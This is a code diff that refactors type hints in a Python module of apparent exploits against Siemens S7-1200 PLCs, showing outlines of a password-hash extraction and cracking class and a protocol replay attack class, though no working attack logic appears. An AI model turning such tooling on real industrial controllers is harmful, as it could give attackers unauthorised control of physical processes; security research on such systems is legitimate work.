@@ -5,10 +5,10 @@ Exploits for recovering passwords from S7-1200 series PLCs.
 Note: S7-1200 has stronger security than S7-300/400.
 """
 
-from typing import Any, Dict, Optional
 import hashlib
 import itertools
 import string
+from typing import Any
 
 
 class S7_1200_WeakHash:
@@ -49,7 +49,7 @@ class S7_1200_WeakHash:
 
         return False
 
-    def execute(self, target) -> Dict[str, Any]:
+    def execute(self, target) -> dict[str, Any]:
         """
         Execute hash extraction and cracking.
 
@@ -91,13 +91,12 @@ class S7_1200_WeakHash:
 
         return result
 
-    def _extract_hash(self, target) -> Optional[Dict[str, Any]]:
+    def _extract_hash(self, target) -> dict[str, Any] | None:
         """Extract password hash from S7-1200"""
         try:
             # S7-1200 stores password hash in specific memory region
             # Access through S7comm protocol
 
-            client = target.device._client
 
             # Try to read from system info area
             # The exact location depends on firmware version
@@ -119,7 +118,7 @@ class S7_1200_WeakHash:
         except Exception:
             return None
 
-    def _crack_hash(self, hash_bytes: bytes, salt: Optional[bytes] = None) -> Optional[str]:
+    def _crack_hash(self, hash_bytes: bytes, salt: bytes | None = None) -> str | None:
         """
         Attempt to crack the password hash.
 
@@ -153,7 +152,7 @@ class S7_1200_WeakHash:
         self,
         password: str,
         expected_hash: bytes,
-        salt: Optional[bytes] = None
+        salt: bytes | None = None
     ) -> bool:
         """
         Verify if password matches hash.
@@ -166,7 +165,7 @@ class S7_1200_WeakHash:
     def _compute_s7_1200_hash(
         self,
         password: str,
-        salt: Optional[bytes] = None
+        salt: bytes | None = None
     ) -> bytes:
         """
         Compute S7-1200 password hash.
@@ -217,7 +216,7 @@ class S7_1200_ProtocolReplay:
         return ('s7-1200' in info.model.lower() and
                 ('v1' in firmware or 'v2' in firmware))
 
-    def execute(self, target) -> Dict[str, Any]:
+    def execute(self, target) -> dict[str, Any]:
         """
         Execute replay attack.
 
